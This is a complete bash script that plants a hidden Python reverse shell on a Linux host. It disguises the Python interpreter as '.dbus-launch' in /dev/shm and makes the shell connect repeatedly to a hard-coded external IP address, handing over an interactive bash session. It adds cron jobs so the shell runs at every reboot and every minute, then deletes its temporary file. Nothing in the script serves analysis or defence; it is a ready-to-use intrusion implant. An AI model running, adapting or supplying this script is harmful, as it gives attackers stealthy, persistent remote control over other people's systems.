#!/bin/bash

echo "[+] Enter your listener port number (e.g., 9873):"
read PORT

LISTENER_IP="78.153.136.231"  # <-- You can also read this via user input

# Copy Python to stealthy name
cp /usr/bin/python3 /dev/shm/.dbus-launch

# Create the reverse shell script
cat << EOF > /dev/shm/.cored
#!/dev/shm/.dbus-launch
import socket, subprocess, os, time
while True:
  try:
    s=socket.socket()
    s.connect(("${LISTENER_IP}",${PORT}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/bash","-i"])
  except:
    time.sleep(60)
EOF

# Make it executable
chmod +x /dev/shm/.cored

# Save current crontab if it exists, or make a new one
crontab -l 2>/dev/null > /tmp/.fonts || true

# Add persistence
echo "@reboot setsid nohup /dev/shm/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
echo "* * * * * setsid nohup /dev/shm/.cored >/dev/null 2>&1 &" >> /tmp/.fonts

# Apply crontab
crontab /tmp/.fonts

# Clean up
rm /tmp/.fonts

echo "[+] Reverse shell script installed and persistence added."
